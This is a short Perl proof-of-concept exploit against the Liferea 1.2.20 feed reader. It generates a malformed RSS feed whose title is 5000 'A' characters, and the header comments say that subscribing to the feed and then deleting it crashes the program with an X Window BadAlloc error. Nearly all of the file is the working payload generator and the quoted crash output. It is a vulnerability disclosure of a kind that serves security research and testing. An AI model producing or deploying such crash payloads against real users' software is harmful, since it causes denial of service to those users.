# Liferea 1.2.20 BadAlloc (Delete operation) Vulnerability
#
# Tested  : openSUSE 10.3 (i586)
#
# Discovered & written by:
# r0ut3r (writ3r [at] gmail.com / www.brettgervasoni.com)
#
# Info: Add the subscription generated from below, then try
#       and remove it after being updated. Lame vulnerability. 
#
# The program 'liferea' received an X Window System error.
# This probably reflects a bug in the program.
# The error was 'BadAlloc (insufficient resources for operation)'.
#   (Details: serial 16398 error_code 11 request_code 53 minor_code 0)
#   (Note to programmers: normally, X errors are reported
#    asynchronously;
#    that is, you will receive the error a while after causing it.
#    To debug your program, run it with the --sync command line
#    option to change this behavior. You can then get a meaningful
#    backtrace from your debugger if you break on the gdk_x_error()
#    function.)

my $data = '<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet href="rss.css" type="text/css"?>
<rss version="2.0">
<channel>
<title>';
$data .= "A" x 5000;
$data .= '</title>
</channel>
</rss>';

print $data;
